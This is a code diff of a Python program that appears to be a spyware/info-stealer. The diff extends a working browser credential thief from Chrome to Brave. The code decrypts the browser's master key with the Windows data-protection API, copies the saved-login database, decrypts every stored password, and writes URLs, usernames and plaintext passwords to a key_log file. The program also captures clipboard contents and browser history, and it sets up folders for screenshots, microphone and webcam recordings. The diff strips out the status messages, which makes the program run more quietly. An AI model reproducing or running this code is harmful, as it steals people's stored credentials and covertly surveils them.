@@ -74,18 +74,33 @@ def get_chrome_datetime(chromedate):
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
 
-def get_encryption_key():
-    local_state_path = os.path.join(os.environ["USERPROFILE"],
-                                    "AppData", "Local", "Google", "Chrome",
-                                    "User Data", "Local State")
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = f.read()
-        local_state = json.loads(local_state)
+def get_encryption_key(browser='chrome'):
 
-    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    key = key[5:]
+    if browser == 'chrome':
+        local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                        "AppData", "Local", "Google", "Chrome",
+                                        "User Data", "Local State")
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
 
-    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        key = key[5:]
+
+        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+    elif browser == 'brave':
+        local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                        "AppData", "Local", "BraveSoftware", "Brave-Browser",
+                                        "User Data", "Local State")
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+
+        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        key = key[5:]
+
+        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
 
 def decrypt_password(password, key):
@@ -104,85 +119,125 @@ def decrypt_password(password, key):
             return ""
 
 
+def get_passwords(key, browser='chrome'):
+    if browser == 'chrome':
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                            "Google", "Chrome", "User Data", "Default", "Login Data")
+
+        filename = "ChromeData.db"
+        shutil.copyfile(db_path, filename)
+
+        db = sqlite3.connect(filename)
+        cursor = db.cursor()
+
+        cursor.execute(
+            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+
+        browser_passwords = []
+
+        for row in cursor.fetchall():
+            origin_url = row[0]
+            action_url = row[1]
+            username = row[2]
+            password = decrypt_password(row[3], key)
+            date_created = row[4]
+            date_last_used = row[5]
+            if username or password:
+                browser_passwords.append(f"Origin URL: {origin_url}")
+                browser_passwords.append(f"Action URL: {action_url}")
+                browser_passwords.append(f"Username: {username}")
+                browser_passwords.append(f"Password: {password}")
+            else:
+                continue
+            if date_created != 86400000000 and date_created:
+                browser_passwords.append(f"Creation date: {str(get_chrome_datetime(date_created))}")
+            if date_last_used != 86400000000 and date_last_used:
+                browser_passwords.append(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
+            browser_passwords.append("="*50)
+
+        with open(f'{PATH}/results/key_log/' + 'passwords.txt', 'a') as browser_psw:
+            browser_psw.write(json.dumps(
+                browser_passwords, indent=4, sort_keys=True))
+
+        cursor.close()
+        db.close()
+        try:
+            os.remove(filename)
+        except:
+            pass
+
+    elif browser == 'brave':
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                            "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
+
+        filename = "BraveData.db"
+        shutil.copyfile(db_path, filename)
+
+        db = sqlite3.connect(filename)
+        cursor = db.cursor()
+
+        cursor.execute(
+            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+
+        browser_passwords = []
+
+        for row in cursor.fetchall():
+            origin_url = row[0]
+            action_url = row[1]
+            username = row[2]
+            password = decrypt_password(row[3], key)
+            date_created = row[4]
+            date_last_used = row[5]
+            if username or password:
+                browser_passwords.append(f"Origin URL: {origin_url}")
+                browser_passwords.append(f"Action URL: {action_url}")
+                browser_passwords.append(f"Username: {username}")
+                browser_passwords.append(f"Password: {password}")
+            else:
+                continue
+            if date_created != 86400000000 and date_created:
+                browser_passwords.append(f"Creation date: {str(get_chrome_datetime(date_created))}")
+            if date_last_used != 86400000000 and date_last_used:
+                browser_passwords.append(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
+            browser_passwords.append("="*50)
+
+        with open(f'{PATH}/results/key_log/' + 'passwords.txt', 'a') as browser_psw:
+            browser_psw.write(json.dumps(
+                browser_passwords, indent=4, sort_keys=True))
+
+        cursor.close()
+        db.close()
+        try:
+            os.remove(filename)
+        except:
+            pass
+
+
 def main():
 
     create_folder = f'{PATH}/results'
 
     if os.path.exists(create_folder):
-        print("Directory already exists")
         shutil.rmtree(create_folder)
-        print("Deleted {} directory".format(create_folder))
         os.mkdir(create_folder)
-        print("Created new directory")
 
     else:
         os.mkdir(create_folder)
-        print("Created new directory")
 
     directories = [f'{PATH}/results/screenshots/', f'{PATH}/results/key_log/',
                    f'{PATH}/results/microphone/', f'{PATH}/results/webcam/']
 
     for i in directories:
         if os.path.exists(i):
-            print("Directory already exists")
             shutil.rmtree(create_folder)
-            print("Deleted {} directory".format(i))
             os.mkdir(i)
-            print("Created new directory")
 
         else:
             os.mkdir(i)
-            print("Created new directory")
 
-    # Get Chrome passwords
-    key = get_encryption_key()
-
-    # Mac OS path = ~/Library/Application Support/Google/Chrome/Default/Login Data
-
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                           "Google", "Chrome", "User Data", "default", "Login Data")
-
-    filename = "ChromeData.db"
-    shutil.copyfile(db_path, filename)
-
-    db = sqlite3.connect(filename)
-    cursor = db.cursor()
-
-    cursor.execute(
-        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-
-    browser_passwords = []
-
-    for row in cursor.fetchall():
-        origin_url = row[0]
-        action_url = row[1]
-        username = row[2]
-        password = decrypt_password(row[3], key)
-        date_created = row[4]
-        date_last_used = row[5]
-        if username or password:
-            browser_passwords.append(f"Origin URL: {origin_url}")
-            browser_passwords.append(f"Action URL: {action_url}")
-            browser_passwords.append(f"Username: {username}")
-            browser_passwords.append(f"Password: {password}")
-        else:
-            continue
-        if date_created != 86400000000 and date_created:
-            browser_passwords.append(f"Creation date: {str(get_chrome_datetime(date_created))}")
-        if date_last_used != 86400000000 and date_last_used:
-            browser_passwords.append(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
-        browser_passwords.append("="*50)
-
-    with open(f'{PATH}/results/key_log/' + 'passwords.txt', 'a') as browser_psw:
-        browser_psw.write(json.dumps(
-            browser_passwords, indent=4, sort_keys=True))
-
-    cursor.close()
-    db.close()
-    try:
-        os.remove(filename)
-    except:
-        pass
+    # Get Chrome/Brave passwords
+    key = get_encryption_key(browser='brave')
+    get_passwords(key=key, browser='brave')
 
     # Clipboard Data
     try:
@@ -193,7 +248,7 @@ def main():
         with open(f'{PATH}/results/key_log/' + 'clipboard_info.txt', 'a') as clipboard_info:
             clipboard_info.write('Clipboard Data: ' + pasted_data + ' \n')
     except:
-        print("Couldn't get Clipboard Data")
+        pass
 
     # Browser History
     browser_history = []
